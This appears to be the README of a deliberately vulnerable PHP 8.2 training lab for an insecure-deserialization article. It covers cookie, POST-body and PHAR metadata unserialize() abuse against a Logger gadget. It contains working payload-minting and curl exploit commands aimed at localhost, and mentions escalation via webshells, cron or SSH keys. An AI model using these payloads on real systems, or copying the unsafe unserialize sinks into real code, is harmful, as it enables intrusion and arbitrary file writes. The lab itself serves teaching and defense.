# deser-basic

A deliberately vulnerable PHP 8.2 + Apache app that demonstrates the three main shapes of PHP `unserialize()` abuse against a single gadget class. Companion lab for the [TechEarl insecure deserialization article](https://techearl.com/insecure-deserialization).

The gadget is `Logger` (see `src/Logger.php`). Its `__destruct` writes attacker-controlled bytes to an attacker-controlled file path. Real-world Laravel/Symfony/WordPress chains string together half a dozen classes via magic methods to reach a sink; this lab collapses the chain into one node so the wire format stays readable.

Every successful exploit appends to `/tmp/pwned` inside the container. Verify with `docker compose exec deser-basic cat /tmp/pwned` after each payload.

## Endpoints

| Endpoint | Method | Source | Sink |
|---|---|---|---|
| `/cookie.php` | GET | `state` cookie, base64 of serialized PHP | `unserialize(base64_decode($_COOKIE['state']))` |
| `/post.php` | POST | `data` form field, raw serialized PHP | `unserialize($_POST['data'])` |
| `/phar_demo.php` | GET | attacker-supplied path | `file_exists($file)` and optionally `Phar::getMetadata(['allowed_classes' => true])` |

## Boot

From the root of the `techearl-labs` repo, after merging `docker-compose.snippet.yml` into the root compose file:

```bash
docker compose up -d --build deser-basic
```

App is at `http://localhost:8087`. The landing page lists the endpoints.

## Expected exploit paths

All three payloads target the same `Logger` gadget pointing at `/tmp/pwned`. Reset between attempts with:

```bash
docker compose exec deser-basic sh -c 'echo -n > /tmp/pwned'
```

### 1. Cookie unserialize (base64-wrapped)

The application stores a "session state" object in a `state` cookie, base64-encoded so it survives `Set-Cookie` transport, and unserializes it on every request without filtering. Same shape as old Rails 3 Marshal cookies, ASP.NET ViewState with MAC disabled, and a thousand PHP-framework session backends from the pre-2018 era.

Mint the payload (a Logger gadget whose destructor writes to `/tmp/pwned`):

```bash
COOKIE=$(docker compose exec deser-basic php -r '
require "/var/www/src/Logger.php";
$g = new Logger();
$g->logFile = "/tmp/pwned";
$g->payload = "cookie-fired\n";
echo base64_encode(serialize($g));
')
curl -s -b "state=${COOKIE}" http://localhost:8087/cookie.php
docker compose exec deser-basic cat /tmp/pwned
```

Expected: response prints `deserialized state object of type: Logger`, and `/tmp/pwned` contains `cookie-fired`.

### 2. POST-body unserialize (raw wire format)

A `data` form field carries the raw PHP serialization wire format directly; no base64 wrapping. Common in B2B integrations and internal SOAP-replaced-with-PHP-serialize endpoints, which live forever once they ship because every existing client speaks them.

```bash
curl -s --data-urlencode $'data=O:6:"Logger":2:{s:7:"logFile";s:10:"/tmp/pwned";s:7:"payload";s:11:"post-fired\n";}' \
  http://localhost:8087/post.php
docker compose exec deser-basic cat /tmp/pwned
```

Expected: response prints `deserialized envelope of type: Logger`, and `/tmp/pwned` gains a `post-fired` line.

### 3. PHAR-stream deserialization (with an honest PHP 8.2 caveat)

The classic Sam Thomas 2018 attack: a filesystem function (`file_exists`, `is_file`, `file_get_contents`, `fopen`, `filesize`) called with a `phar://` URL caused PHP to parse the archive manifest and unserialize its metadata block. The bug lived in any code that thought it was just checking whether an uploaded file existed.

PHP 8.0 hardened this surface. From the 8.0 changelog: `Phar` metadata is no longer auto-unserialized through the stream wrapper, and `Phar::getMetadata()` requires an explicit `['allowed_classes' => ...]` option to deserialize objects. On the lab's PHP 8.2 runtime:

```bash
curl -s 'http://localhost:8087/phar_demo.php?file=phar:///var/www/html/uploads/avatar.phar'
docker compose exec deser-basic cat /tmp/pwned
```

The `file_exists` call still returns true (the archive is real), but the `Logger` gadget does not fire on PHP 8.x. `/tmp/pwned` stays empty.

To still observe the gadget executing, the endpoint accepts `?unsafe=1`, which opts back into the dangerous behaviour by calling `Phar::getMetadata(['allowed_classes' => true])`. That is exactly the API surface an application opts into when it "needs to read PHAR metadata", which is the realistic shape of the bug today: it has moved from "any `file_exists` is a sink" to "any code that calls `getMetadata` without an allow-list is a sink".

```bash
docker compose exec deser-basic sh -c 'echo -n > /tmp/pwned'
curl -s 'http://localhost:8087/phar_demo.php?file=/var/www/html/uploads/avatar.phar&unsafe=1'
docker compose exec deser-basic cat /tmp/pwned
```

Expected: response prints `metadata type: Logger`, and `/tmp/pwned` contains `phar-deser-fired`. This is real, current 2026 behaviour against PHP 8.2. The textbook "file_exists on a `phar://` URL fires the gadget" works only against PHP 7.x; the article walks both.

## Tearing down

```bash
docker compose down deser-basic
```

No persistent volumes, so nothing to purge between attempts.

## Safety

Bound to `127.0.0.1` by default. Do not expose this container to a public interface: the lab unserializes attacker-controlled bytes into a class whose destructor writes arbitrary files to disk, which is one or two pivots away from arbitrary code execution on the container (drop a webshell under `/var/www/html/`, drop a cron, drop an `~/.ssh/authorized_keys` if root). Tear it down with `docker compose down deser-basic` when you are finished.
